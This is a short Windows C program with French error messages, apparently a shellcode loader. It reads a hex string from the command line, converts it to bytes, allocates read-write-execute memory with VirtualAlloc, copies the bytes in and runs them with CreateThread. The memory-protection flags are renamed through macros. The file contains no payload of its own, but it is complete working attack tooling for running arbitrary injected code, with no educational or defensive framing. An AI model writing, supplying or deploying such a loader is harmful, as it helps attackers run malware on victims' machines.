#include <windows.h>
#include <stdio.h>

#define EXECUTEREADWRITE_FLAG 0x40
#define COMMIT_RESERVE_FLAG 0x3000

void hexStringToByteArray(const char *hexString, unsigned char **shellcode, size_t *size) {
    size_t len = strlen(hexString);
    if (len % 2 != 0) return;

    *size = len / 2;
    *shellcode = (unsigned char *)malloc(*size);
    if (!(*shellcode)) return;

    for (size_t i = 0; i < *size; i++) {
        sscanf(hexString + (i * 2), "%2hhx", &(*shellcode)[i]);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (lpCmdLine == NULL || strlen(lpCmdLine) == 0) {
        MessageBox(NULL, "Aucun shellcode fourni!", "Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    unsigned char *shellcode = NULL;
    size_t shellcodeSize = 0;

    hexStringToByteArray(lpCmdLine, &shellcode, &shellcodeSize);
    if (!shellcode || shellcodeSize == 0) {
        MessageBox(NULL, "Échec de la conversion du shellcode", "Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }
    LPVOID payloadAddress = VirtualAlloc(NULL, shellcodeSize, COMMIT_RESERVE_FLAG, EXECUTEREADWRITE_FLAG);
    if (!payloadAddress)
    {
        printf("Échec de l'allocation mémoire\n");
        return (1);
    }
    memcpy(payloadAddress, shellcode, shellcodeSize);
    HANDLE payloadThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payloadAddress, NULL, 0, NULL);
    if (!payloadThread)
    {
        printf("Échec de la création du thread\n");
        return (1);
    }
    WaitForSingleObject(payloadThread, INFINITE);
    return (0);
}